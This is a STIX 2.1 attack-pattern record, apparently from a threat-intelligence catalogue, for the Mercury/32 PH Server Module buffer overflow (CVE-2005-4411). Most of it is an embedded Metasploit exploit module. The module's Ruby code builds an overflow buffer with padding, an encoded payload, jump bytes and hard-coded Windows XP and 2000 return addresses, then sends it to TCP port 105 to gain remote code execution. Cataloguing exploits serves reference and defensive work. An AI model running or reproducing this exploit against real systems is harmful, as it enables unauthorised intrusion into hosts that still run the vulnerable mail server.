{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e52f9c7d-677b-47cd-9e8f-9cbd7fa6e303",
    "created": "2024-08-14T16:47:00.029562Z",
    "modified": "2024-08-14T16:47:00.029566Z",
    "name": "Mercury/32 PH Server Module Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Mercury/32 <= v4.01b PH Server Module. This issue is due to a failure of the application to properly bounds check user-supplied data prior to copying it to a fixed size memory buffer. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/mercury_phonebook.rb",
            "external_id": "mercury_phonebook.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-4411"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mercury/32 PH Server Module Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in\n        Mercury/32 <= v4.01b PH Server Module. This issue is\n        due to a failure of the application to properly bounds check\n        user-supplied data prior to copying it to a fixed size memory buffer.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-4411' ],\n          [ 'OSVDB', '22103'],\n          [ 'BID', '16396' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],\n          [ 'Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4 } ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2005-12-19',\n      'DefaultTarget' => 0))\n\n    register_options([ Opt::RPORT(105)], self)\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sploit =  rand_text_alphanumeric(224, payload_badchars)\n    sploit << payload.encoded + \"\\xeb\\x06\" + make_nops(2)\n    sploit << [target.ret].pack('V') + [0xe8, -450].pack('CV') + \"\\r\\n\"\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-12-19",
    "x_mitre_platforms": [
        "win'"
    ]
}